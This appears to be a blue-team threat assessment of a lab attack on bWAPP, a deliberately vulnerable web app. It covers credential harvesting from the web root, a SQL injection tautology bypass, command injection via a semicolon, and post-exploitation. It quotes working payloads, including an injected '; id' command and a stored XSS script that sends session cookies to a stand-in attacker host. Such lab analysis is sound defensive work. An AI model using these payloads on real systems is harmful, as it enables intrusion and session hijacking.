# Threat Assessment — BLUE-2026-03-13-001

**Target**: 10.10.30.128 (bWAPP — Buggy Web Application)
**Incident ID**: BLUE-2026-03-13-001
**Assessment Date**: 2026-03-13
**Analyst Mode**: Artifact reconstruction (no live IDS feed)

---

## Executive Summary

A complete, multi-stage attack was conducted against bWAPP at 10.10.30.128 during the window 10:00Z–11:45Z on 2026-03-13. The attacker successfully:

1. Enumerated sensitive credential files from an open web directory without authentication
2. Authenticated as an administrator using leaked credentials
3. Bypassed login authentication via SQL injection (tautological boolean bypass)
4. Achieved remote code execution via OS command injection
5. Established a persistent JavaScript execution vector via stored XSS
6. Exfiltrated the full database, /etc/passwd, and MySQL root credentials via RCE

The application presented no meaningful resistance at any stage. All four exploitation steps required minimal effort and no specialized tooling. The incident represents a complete compromise of confidentiality and integrity at the application layer, with significant risk of lateral movement through the MySQL service exposed on TCP/3306.

---

## Attack Narrative

### Stage 1: Passive Credential Harvest (10:00–10:15Z)

Before sending a single attack payload, the attacker retrieved full administrative credentials by downloading files from web-accessible directories. The `robots.txt` file advertised the existence of `/passwords/` and `/db/`, both of which had directory listing enabled and required no authentication.

From these directories the attacker obtained:
- `wp-config.bak` — MySQL credentials (thor/Asgard)
- `heroes.xml` — Six plaintext username/password pairs
- `bwapp.sqlite` — Full SQLite database containing SHA1-hashed admin credentials

The SHA1 hash `6885858486f31043e5839c735d99457f045affd0` is trivially reversible to `bug`, yielding the admin password without any brute-force.

This stage represents a complete failure of data-at-rest protection — credentials were stored in backup files within the web root with no access controls.

### Stage 2: Authentication Compromise (11:00–11:10Z)

Two independent authentication bypasses were demonstrated:

**Method A — Credential Stuffing from Leaked Files**: The attacker logged in as admin `A.I.M.` using the password `bug` harvested from `bwapp.sqlite`. This required no attack technique — only downloading a publicly accessible file.

**Method B — SQL Injection Tautology**: On `/sqli_16.php`, the attacker submitted a boolean tautology (`bee' AND '1'='1' OR '1'='1`) that caused the application's SQL query to return the first user record regardless of the password supplied. This bypassed the medium-security `addslashes()` filter because the payload does not require modification of the outer string delimiters.

Both methods independently produced full admin access, illustrating defense-in-depth failure at the authentication layer.

### Stage 3: Remote Code Execution (11:10Z)

The DNS lookup form at `/commandi.php` passed user input directly to a shell command via `escapeshellcmd()`. However, `escapeshellcmd()` does not escape the semicolon character in all contexts, allowing the attacker to chain a second shell command:

```
target=www.nsa.gov; id
```

The server responded with: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

This confirmed full shell access as the web server process. The correct countermeasure would be `escapeshellarg()` applied to individual parameters, not `escapeshellcmd()` applied to the whole command.

### Stage 4: Post-Exploitation Data Collection (11:15–11:30Z)

Via repeated RCE commands, the attacker:
- Read `/app/admin/settings.php` — discovering MySQL root with empty password
- Executed MySQL queries directly, dumping all user records
- Read `/etc/passwd` — confirming system user structure
- Confirmed Docker container environment (hostname `770425fcb17d`) — limiting container escape risk
- Identified Ubuntu 14.04 EOL status — flagging kernel exploit potential (Dirty COW, CVE-2015-1328)

### Stage 5: Persistent Threat Establishment (11:15Z)

A stored XSS payload was injected into the blog feature at `/xss_stored_1.php`. Since the `PHPSESSID` cookie lacks the `HttpOnly` flag, this payload enables session cookie theft from every user who visits the blog page. The attacker demonstrated the full session hijacking chain:

1. Inject: `<script>document.location='http://attacker/steal?c='+document.cookie</script>`
2. Every victim visiting the blog executes this script
3. Their PHPSESSID is transmitted to the attacker
4. Attacker replays the cookie to impersonate the victim

This payload remains in the database until explicitly deleted — constituting a persistent, ongoing threat to all users.

---

## Threat Actor Assessment

**Sophistication Level**: LOW to MEDIUM
- No 0-day exploitation; all vulnerabilities are well-known web application classes (OWASP Top 10)
- No custom tooling required — standard HTTP requests with manual payloads
- Attack leveraged application's own built-in weaknesses rather than external exploit frameworks
- Security level bypass (using session-level security parameter) shows familiarity with bWAPP's design

**Intent Indicators**:
- Objective-focused: reached admin access, RCE, and DB dump efficiently
- No destructive actions taken (no file deletion, no DoS)
- Consistent with reconnaissance and data collection objectives

**Access Level Achieved**:
- Application: Full admin access (two independent vectors)
- Database: Full read access via RCE (MySQL root, no password)
- OS: Command execution as www-data within Docker container
- Persistent: Stored XSS payload active in database

---

## Comparison to Prior Engagements

| Factor | DVWA (2026-03-13) | bWAPP (2026-03-13) |
|---|---|---|
| Target | 10.10.30.129 | 10.10.30.128 |
| Security Level | Low | Medium |
| RCE Achieved | Yes (CMDi) | Yes (CMDi — semicolon bypass) |
| SQLi | Yes | Yes (AND/OR tautology bypass) |
| XSS | Yes (stored) | Yes (stored) |
| Credential Harvest | Basic | Extensive (files in web root) |
| Post-Ex Depth | Moderate | High (MySQL root via RCE, /etc/passwd) |
| Novel Technique | None | addslashes() bypass, escapeshellcmd() semicolon gap |

The bWAPP medium-security setting provided marginally more resistance than DVWA low-security, but all filters were bypassed with straightforward techniques. The open credential files in the web root represent an additional attack surface not present in the DVWA engagement.

---

## Key Risk Factors

1. **No Defense-in-Depth**: Every layer failed independently — no compensating controls
2. **Credentials in Web Root**: Trivially eliminates all authentication controls
3. **EOL Software Stack**: PHP 5.5.9 (EOL 2016), MySQL 5.5 (EOL 2018), Ubuntu 14.04 (EOL 2019)
4. **MySQL Network Exposure**: TCP/3306 bound to all interfaces with root/empty password
5. **No Input Validation**: SQL injection and command injection both trivially exploitable
6. **Persistent XSS Active**: Stored payload remains in database — ongoing risk to users
7. **No Security Headers**: Missing CSP, X-Frame-Options, X-XSS-Protection
8. **Session Cookie Weakness**: No HttpOnly/Secure flags compound XSS risk to session hijacking

---

## Threat Level Determination

| Dimension | Rating | Rationale |
|---|---|---|
| Exploitability | CRITICAL | All vulnerabilities exploitable without authentication or advanced skills |
| Impact | CRITICAL | Full confidentiality/integrity compromise; persistent XSS payload |
| Scope | HIGH | Affects all users of the application; MySQL exposed to entire network |
| Detectability | LOW | No WAF, IPS, or alerting in place; attacks would go undetected |
| Remediation Complexity | MEDIUM | Requires full stack update + application redesign |

**Overall Threat Assessment: CRITICAL**
